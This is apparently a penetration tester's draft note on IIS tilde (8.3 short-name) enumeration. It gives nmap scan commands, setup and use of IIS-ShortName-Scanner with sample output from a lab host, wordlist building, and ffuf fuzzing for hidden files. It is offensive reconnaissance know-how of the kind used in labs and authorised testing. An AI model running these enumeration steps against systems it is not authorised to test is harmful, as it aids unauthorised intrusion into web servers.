---
Primary_category: "[[WEB TECHNOLOGIES]]"
title: ""
draft: true
banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
banner_y: 0.88286
tags:
cssclasses:
---

###### PRIMARY CATEGORY → [[WEB TECHNOLOGIES]]

#### *Tilde Enumeration*

> ***Affected Versions → ***

This technique leverages the *short file* names on *Windows* systems, following the *8.3* naming convention

```bash
C:\Program Files → C:\PROGRA~1
```

The latter can be used to fuzz for certain resources, both directories and files

##### *Initial Enumeration*

First, we must know which ports are open on the target. In this case, we can apply the technique in question if the target is running an *IIS* server

###### *Nmap*

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn --disable-arp-ping -oG <TARGET>.allPorts <TARGET>
```

```bash
nmap -p"$( grep -ioP --color -- '\s\d{1,5}(?=/open)' <TARGET>.allPorts | xargs | sed 's@\s@,@g' )" -sV -sC -v -n -Pn --disable-arp-ping -oN <TARGET>.targeted <TARGET>
```


##### *Tilde Enumeration with IIS-ShortName-Scanner*

> ***[IIS-Shortname-Scanner](https://github.com/irsdl/IIS-ShortName-Scanner)***

###### *Setup*

```bash
git clone https://github.com/irsdl/IIS-ShortName-Scanner IIS-Shortname-Scanner
cd !$/release
```

###### *Usage*

```bash
java -jar IIS-ShortName-Scanner/release/iis_shortname_scanner.jar 0 5 '<URL>'
```

> [!NOTE]- *Command Output*
>
> ```bash
> Do you want to use proxy [Y=Yes, Anything Else=No]? No
> Early result: the target is probably vulnerable.
> Early result: identified letters in names > A,C,D,E,F,L,N,O,P,R,S,T,U,X
> Early result: identified letters in extensions > A,C,P,S
> # IIS Short Name (8.3) Scanner version 2023.4 - scan initiated 2026/04/03 19:02:13
> Target: http://10.129.36.233/
> |_ Result: Vulnerable!
> |_ Used HTTP method: OPTIONS
> |_ Suffix (magic part): /~1/.rem
> |_ Extra information:
>   |_ Number of sent requests: 571
>   |_ Identified directories: 2
>     |_ ASPNET~1
>     |_ UPLOAD~1
>   |_ Identified files: 2
>     |_ CSASPX~1.CS
>       |_ Actual extension = .CS
>     |_ TRANSF~1.ASP
> ```
>

##### *Creating a Wordlist*

Once we know the *short file* names related to the existing resources, we can create a wordlist containing words that begin with the discovered ones

In this case, we have discovered the *TRANSF~1.ASP short file* name, so, we can proceed as follows

```bash
grep -RiP --color -- '^transf' /usr/share/wordlists /usr/share/seclist | sed 's@^.*:@@g' | sort -u > wordlist.txt
```

##### *Fuzzing for existing files*

Lastly, we can fuzz for existing resources using the previous generated wordlist and a *fuzzing* tool such as ***[Fuff](https://github.com/ffuf/ffuf)***

```bash
ffuf -v -t <THREADS> -w './wordlist.txt' -e '.asp,aspx' -u '<TARGET>/FUZZ'
```

